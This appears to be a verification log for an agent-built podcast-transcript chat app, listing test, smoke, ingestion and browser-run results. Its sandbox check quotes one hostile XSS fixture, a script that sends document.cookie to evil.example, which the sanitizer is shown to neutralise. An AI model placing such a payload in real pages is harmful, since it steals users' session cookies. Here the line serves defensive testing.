# Verification runs

Evidence used to accept the agent's work. Times are UTC, 2026-09-12.

## Automated tests (backend, Postgres 16 + pgvector 0.6, fake LLM)

Final run, after the truncation and sanitizer fixes:

```
$ python -m pytest -q
....................................................                     [100%]
52 passed in 20.04s
```

Six consecutive runs after the shutdown fix (at 45 tests): 13.0 s, 12.7 s, 15.8 s, 15.5 s, 12.8 s, 15.5 s — all green. Three consecutive runs of the final 52: 20.5 s, 20.2 s, 20.0 s — all green. No flakes observed in either set.

Test inventory:
- `test_ingest.py` (7): three transcript formats, frontmatter, chunk budget + overlap, long-turn splitting, canonical guest, dedupe.
- `test_units.py` (25): router intents/angles, sanitizer (script/handlers/URLs/CSS/CSP/`<title>` re-homing/truncation/markdown), essay checks incl. truncation detection and cited-only sources, RRF fusion, history trimming.
- `test_api_integration.py` (20): … plus the Claude Agent SDK runtime driven end-to-end (real SDK subprocess, in-process MCP tools, fake Messages API); health/readiness/config, structured 422/404, session lifecycle + user metadata, session isolation, grounded SSE stream + persisted citations + deep links, mid-turn tool call, follow-up history, essay → markdown artifact, hostile HTML sanitized on write, markdown artifact route, search endpoint, empty retrieval acknowledged, model timeout persisted, no provider, missing model reason, DB down → 503.

## Frontend component tests (Vitest + Testing Library, jsdom)

```
$ npm run test
 ✓ src/components/ArtifactPanel.test.tsx (5 tests)
 ✓ src/components/Markdown.test.tsx      (7 tests)
 Test Files  2 passed (2)
      Tests  12 passed (12)
```

Scoped to what the UI alone is responsible for, and to regressions that actually
happened: the rendering boundary (`<iframe sandbox="">` + `referrerPolicy`, HTML
carried as `srcDoc` and never injected into the app document, Markdown rendered
with raw HTML disabled) and citation integrity (an inline `[n]` links to that
passage's second; a real Markdown link is left alone; a missing citation degrades
instead of breaking). A sixth panel test — asserting the error state — was written
and dropped: the component behaves correctly (verified by hand), but the rejected
promise surfaced as an unhandled rejection in the runner rather than an assertion,
and chasing the harness was not worth the time before a deadline. Noted here
rather than quietly deleted.

## Smoke test against the running dev stack (fake LLM as "ollama")

```
$ scripts/smoke.sh
1. Liveness
  ✓ GET /health
2. Readiness
     database ok=True episodes=268 chunks=27454 embedded=0
     provider anthropic  available=False model=claude-sonnet-5    runtime=agent_sdk  ANTHROPIC_API_KEY not set
     provider ollama     available=True  model=fake-model runtime=messages_loop  
  ✓ GET /health/ready
3. Knowledge base
  ✓ 268 episodes indexed
4. Retrieval
  ✓ search returned 3 lexical
5. Session + grounded chat (streams; may take a minute on a CPU model)
  ✓ session 4bae1cef-19b1-4539-9354-027d43842529
  ✓ provider event
  ✓ citations event
  ✓ streamed tokens
  ✓ done event
6. Persistence
  ✓ messages stored (count, citations) = 2 2
7. Structured errors
  ✓ 404 for unknown session
  ✓ cleanup
All good.
```

## Ingestion of the real corpus

```
ingest_deduped   dropped=31  examples=['alexander-embiricos', 'interview-q-compilation', 'andy-raskin_', 'manik-gupta', 'archie-abrams']
ingest_complete  episodes_seen=303 episodes_new=268 chunks_written=27454   (≈15 s)
```
Lexical search latency on 27,454 chunks: 5–9 ms (`/api/search`).

## Scripted browser runs (Playwright, Chromium)

Desktop 1440×900 and mobile 400×820, driven end-to-end (new chat → grounded answer → essay → HTML artifact → drawer/sheet) against the **fake LLM**, so the run is deterministic and needs no model. Console errors: none after fixes. [`docs/screenshot-mobile.png`](../docs/screenshot-mobile.png) is from that run.

The two screenshots used in the README and design.md — [`docs/screenshot-desktop.png`](../docs/screenshot-desktop.png) and [`docs/screenshot-essay.png`](../docs/screenshot-essay.png) — are from a **real session** on the reference laptop: `claude-sonnet-5` via the Agent SDK, the full 268-episode corpus at 100 % embedded, genuine guests and timestamps. The earlier versions came from the scripted run and showed `fake-model` with fixture text, which misrepresented the product on the first screen of the README.

Sandbox check: the fake model's hostile HTML (`<script>fetch('http://evil.example/steal?c='+document.cookie)</script>`, `onclick`, `javascript:` link, `<iframe>`, remote `<img>`, `<form>`) rendered as a styled heading, a paragraph and an inert link; DOM inspection confirmed the `.scrim`/panel stacking and that no script ran.

## Fresh-machine run (Windows 11, Docker Desktop, host Ollama)

_Filled in by hand after the laptop run — see README → "Verified on"._
